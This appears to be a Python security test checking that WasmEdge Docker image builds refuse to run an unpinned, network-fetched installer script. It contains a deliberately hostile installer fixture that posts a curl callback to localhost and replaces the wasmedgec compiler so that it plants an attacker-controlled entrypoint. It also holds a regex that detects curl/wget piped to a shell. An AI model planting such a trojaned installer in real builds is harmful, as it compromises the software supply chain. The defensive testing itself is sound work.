#!/usr/bin/env python3
"""Fail while a WasmEdge image build executes an untrusted installer.

The Dockerfiles under test fetch an installer and run it as root. These tests
serve that response from a local fixture and require:

- the response body is not executed
- a second fetch of the same URL is not executed after a checksum check
- the build fails when the fetched bytes are not the pinned installer
- the Wasm entrypoint copied into the final image is not produced by the
  fetched script

Run:

    python3 tests/test_unpinned_wasmedge_installer.py
"""

import hashlib
import http.server
import os
import re
import shutil
import socket
import subprocess
import tempfile
import threading
import unittest
import urllib.parse
from pathlib import Path


REPO = Path(__file__).resolve().parents[1]
ATTACKER_MARK = b"ATTACKER_CONTROLLED_ENTRYPOINT"
PIPE_TO_SHELL = re.compile(r"(?is)(curl|wget)\b[^\n]*\|\s*(bash|sh|python3?)\b")

CASES = (
    {
        "name": "wasmedge-kafka-mysql",
        "dockerfile": "wasmedge-kafka-mysql/etl/Dockerfile",
        "compose": "wasmedge-kafka-mysql/compose.yml",
        "env_names": ("DATABASE_URL", "KAFKA_URL"),
    },
    {
        "name": "wasmedge-mysql-nginx",
        "dockerfile": "wasmedge-mysql-nginx/backend/Dockerfile",
        "compose": "wasmedge-mysql-nginx/compose.yml",
        "env_names": ("DATABASE_URL",),
    },
)


def _run(cmd, **kwargs):
    return subprocess.run(cmd, text=True, **kwargs)


def _docker(args, **kwargs):
    env = os.environ.copy()
    env["DOCKER_BUILDKIT"] = "1"
    return _run(["sudo", "-n", "-E", "docker", *args], env=env, **kwargs)


class _InstallerServer(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        return

    def _send(self, code, body=b"", content_type="text/plain"):
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if body:
            self.wfile.write(body)

    def do_GET(self):
        path = urllib.parse.urlsplit(self.path).path
        self.server.gets.append(self.path)
        body = self.server.next_body(path)
        self._send(200, body, "application/octet-stream")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        payload = self.rfile.read(length)
        self.server.events.append(payload.decode("utf-8", "replace"))
        self._send(204)


def _evil_script(token, port):
    # Callback is the first side effect so a script that fails later still counts.
    return f"""#!/bin/bash
uid=$(id -u)
curl -fsS -X POST --data "installer token={token} uid=$uid" http://127.0.0.1:{port}/executed || true
mkdir -p /root/.wasmedge/bin
cat > /root/.wasmedge/bin/wasmedgec << 'EOF'
#!/bin/sh
out=
for a in "$@"; do
  out=$a
done
printf '%s\\n' ATTACKER_CONTROLLED_ENTRYPOINT > "$out"
curl -fsS -X POST --data "compiler token={token}" http://127.0.0.1:{port}/executed || true
EOF
chmod +x /root/.wasmedge/bin/wasmedgec
""".encode()


class ResponseSource:
    def __init__(self, mode, port, preimage):
        self.mode = mode
        self.port = port
        self.preimage = preimage
        self.gets = []
        self.events = []
        self.counts = {}
        self._tokens = 0

    def next_body(self, path):
        self._tokens += 1
        token = f"{self.mode}-{self._tokens}"
        evil = _evil_script(token, self.port)
        if self.mode == "evil":
            return evil
        seen = self.counts.get(path, 0) + 1
        self.counts[path] = seen
        if self.preimage is not None and seen == 1:
            return self.preimage
        return evil


def _parse_instructions(text):
    lines = text.splitlines()
    instructions = []
    i = 0
    while i < len(lines):
        raw = lines[i]
        stripped = raw.strip()
        if not stripped or stripped.startswith("#"):
            i += 1
            continue
        block = [raw]
        while block[-1].rstrip().endswith("\\"):
            i += 1
            if i >= len(lines):
                break
            block.append(lines[i])
        header = "\n".join(block)
        heredoc = re.search(r"<<-?\s*(['\"]?)([A-Za-z0-9_]+)\1", header)
        if heredoc and header.lstrip().upper().startswith("RUN"):
            delim = heredoc.group(2)
            i += 1
            body = []
            while i < len(lines) and lines[i].strip() != delim:
                body.append(lines[i])
                i += 1
            if i < len(lines):
                body.append(lines[i])
            instructions.append("\n".join(block + body))
            i += 1
            continue
        logical = []
        for part in block:
            if part.rstrip().endswith("\\"):
                logical.append(part.rstrip()[:-1])
            else:
                logical.append(part)
        instructions.append("\n".join(logical))
        i += 1
    return instructions


def _keep_run(text):
    low = text.lower()
    interesting = any(
        key in low for key in ("install.sh", "sha256sum", "wasmedgec", "curl", "wget")
    )
    return interesting


def _build_dockerfile(original):
    """Return a Dockerfile that keeps the installer and wasmedgec steps."""
    kept = []
    for inst in _parse_instructions(original):
        head = inst.lstrip()
        upper = head.upper()
        if upper.startswith("FROM ") and re.search(r"\bscratch\b", head, re.I):
            break
        if upper.startswith("RUN") and not _keep_run(head):
            continue
        kept.append(inst)
    return "\n".join(kept) + "\n"


def _rewrite_urls(dockerfile, base):
    def repl(match):
        parts = urllib.parse.urlsplit(match.group(0))
        path = parts.path or "/"
        if parts.query:
            path = path + "?" + parts.query
        return base + path

    return re.sub(r"https?://[^\s'\"|]+", repl, dockerfile)


def _pinned_preimage(dockerfile_text, directory):
    pins = {item.lower() for item in re.findall(r"\b[0-9a-fA-F]{64}\b", dockerfile_text)}
    for path in directory.rglob("*"):
        if not path.is_file() or path.stat().st_size > 2_000_000:
            continue
        digest = hashlib.sha256(path.read_bytes()).hexdigest()
        if digest in pins:
            return path.read_bytes()
    if "sha256sum" not in dockerfile_text:
        return None
    copies = re.findall(r"(?m)^COPY\s+(?:--\S+\s+)*([^\s]+)\s+", dockerfile_text)
    scripts = []
    for name in copies:
        path = directory / name
        if not path.is_file():
            continue
        data = path.read_bytes()
        if data.startswith(b"#!") or b"bash" in data[:200] or b"sh" in data[:200]:
            scripts.append(data)
    if len(scripts) == 1:
        return scripts[0]
    return None


def _entrypoint_name(dockerfile_text):
    match = re.search(r"(?m)^ENTRYPOINT\s+\[\s*\"([^\"]+)\"", dockerfile_text)
    if not match:
        raise AssertionError("Dockerfile has no ENTRYPOINT")
    return match.group(1)


def _output_path(dockerfile_text):
    workdir = "/"
    output = None
    for inst in _parse_instructions(dockerfile_text):
        head = inst.lstrip()
        if head.upper().startswith("FROM ") and re.search(r"\bscratch\b", head, re.I):
            break
        if head.upper().startswith("WORKDIR "):
            workdir = head.split(None, 1)[1].strip() or "/"
        if "wasmedgec" in head:
            tokens = head.split()
            output = tokens[-1]
    if output is None:
        raise AssertionError("Dockerfile does not run wasmedgec")
    if output.startswith("/"):
        return output
    if workdir.endswith("/"):
        return workdir + output
    return workdir + "/" + output


def _assert_env_names(compose_text, names):
    for name in names:
        if not re.search(rf"(?m)^\s*{re.escape(name)}\s*:", compose_text):
            raise AssertionError(f"compose file is missing environment name {name}")


def _block_external_http():
    rules = []
    for tool in ("iptables", "ip6tables"):
        if shutil.which(tool) is None:
            continue
        specs = [
            ["-o", "lo", "-m", "comment", "--comment", "installer-test", "-j", "ACCEPT"],
            ["-p", "tcp", "--dport", "80", "-m", "comment", "--comment", "installer-test", "-j", "REJECT"],
            ["-p", "tcp", "--dport", "443", "-m", "comment", "--comment", "installer-test", "-j", "REJECT"],
        ]
        for spec in reversed(specs):
            result = _run(["sudo", "-n", tool, "-I", "OUTPUT", "1", *spec], capture_output=True)
            if result.returncode != 0:
                continue
            rules.append((tool, spec))
    return rules


def _unblock(rules):
    for tool, spec in rules:
        _run(["sudo", "-n", tool, "-D", "OUTPUT", *spec], capture_output=True)


class UnpinnedWasmedgeInstallerTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._rules = _block_external_http()

    @classmethod
    def tearDownClass(cls):
        _unblock(cls._rules)

    def test_every_shell_installer_dockerfile_is_covered(self):
        listed = {case["dockerfile"] for case in CASES}
        extra = []
        for path in REPO.rglob("Dockerfile"):
            text = path.read_text()
            if "install.sh" in text or PIPE_TO_SHELL.search(text):
                rel = str(path.relative_to(REPO))
                if rel not in listed:
                    extra.append(rel)
        self.assertEqual(extra, [])

    def test_tampered_installer_does_not_run(self):
        for case in CASES:
            with self.subTest(sample=case["name"]):
                self._assert_installer_rejected(case, "evil")

    def test_refetched_installer_does_not_run(self):
        for case in CASES:
            with self.subTest(sample=case["name"]):
                self._assert_installer_rejected(case, "refetch")

    def _assert_installer_rejected(self, case, mode):
        dockerfile_path = REPO / case["dockerfile"]
        original = dockerfile_path.read_text()
        compose = (REPO / case["compose"]).read_text()
        _assert_env_names(compose, case["env_names"])
        entrypoint = _entrypoint_name(original)
        output_path = _output_path(original)
        self.assertEqual(
            Path(entrypoint).name,
            Path(output_path).name,
            "final entrypoint is not the wasmedgec output",
        )

        preimage = _pinned_preimage(original, dockerfile_path.parent)
        sock = socket.socket()
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
        sock.close()
        source = ResponseSource(mode, port, preimage if mode == "refetch" else None)
        handler = _InstallerServer
        server = http.server.ThreadingHTTPServer(("127.0.0.1", port), handler)
        server.next_body = source.next_body
        server.gets = source.gets
        server.events = source.events
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        tag = f"unpinned-installer-test:{case['name']}-{mode}"
        try:
            generated = _rewrite_urls(
                _build_dockerfile(original), f"http://127.0.0.1:{port}"
            )
            fetched_untrusted = f"127.0.0.1:{port}" in generated
            with tempfile.TemporaryDirectory() as tmp:
                dockerfile = Path(tmp) / "Dockerfile"
                dockerfile.write_text(generated)
                build = _docker(
                    [
                        "build",
                        "--network=host",
                        "--no-cache",
                        "--progress=plain",
                        "-f",
                        str(dockerfile),
                        "-t",
                        tag,
                        str(dockerfile_path.parent),
                    ],
                    cwd=REPO,
                    capture_output=True,
                )
            wasm = b""
            if build.returncode == 0:
                shown = _docker(
                    ["run", "--rm", "--entrypoint", "cat", tag, output_path],
                    capture_output=True,
                )
                if shown.returncode == 0:
                    wasm = shown.stdout.encode()
            problems = []
            if source.events:
                problems.append(
                    "fetched installer executed during the image build: "
                    + "; ".join(source.events)
                )
            if fetched_untrusted and not source.gets:
                problems.append(
                    "image build did not request the installer URL, so execution was not observed"
                )
            if mode == "evil" and fetched_untrusted and build.returncode == 0:
                problems.append(
                    "image build succeeded after fetching installer bytes that are not pinned"
                )
            if wasm.startswith(ATTACKER_MARK):
                problems.append(
                    f"{entrypoint} in the image is the attacker-controlled entrypoint"
                )
            if problems:
                log = (build.stderr or "")[-4000:]
                self.fail("\n".join(problems) + "\n--- build log ---\n" + log)
        finally:
            server.shutdown()
            server.server_close()
            _docker(["rmi", "-f", tag], capture_output=True)


if __name__ == "__main__":
    unittest.main(verbosity=2)
